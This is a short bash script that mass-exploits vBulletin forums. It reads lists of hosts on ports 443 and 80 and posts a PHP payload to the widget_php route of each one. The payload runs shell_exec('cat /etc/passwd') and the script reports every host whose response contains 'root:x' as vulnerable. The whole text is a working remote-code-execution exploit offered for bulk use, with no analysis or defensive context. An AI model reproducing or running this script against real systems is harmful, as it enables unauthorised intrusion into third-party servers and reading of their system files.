echo "EXPLOITING TARGETS ON PORT 443..."
echo "----------------"
count=1
cat vbullet-443 | while read -r p; do
	echo -ne "$count / `cat vbullet-443 | wc -l` - $p                        "\\r
	curl https://$p/index.php?routestring=ajax/render/widget_php --connect-timeout 5 --max-time 15 -s -k --data "widgetConfig[code]=echo shell_exec('cat /etc/passwd');exit;" | grep -w "root:x" > /dev/null && echo "https://$p                     "
	(( count++ ))
done 

echo "EXPLOITING TARGETS ON PORT 80..."
echo "----------------"
count=1
cat vbullet-80 | while read -r p; do
	echo -ne "$count / `cat vbullet-80 | wc -l` - $p                        "\\r
        curl http://$p/index.php?routestring=ajax/render/widget_php --connect-timeout 5 --max-time 15 -s -k --data "widgetConfig[code]=echo shell_exec('cat /etc/passwd');exit;" | grep -w "root:x" > /dev/null && echo "http://$p                       "
	(( count++ ))
done 
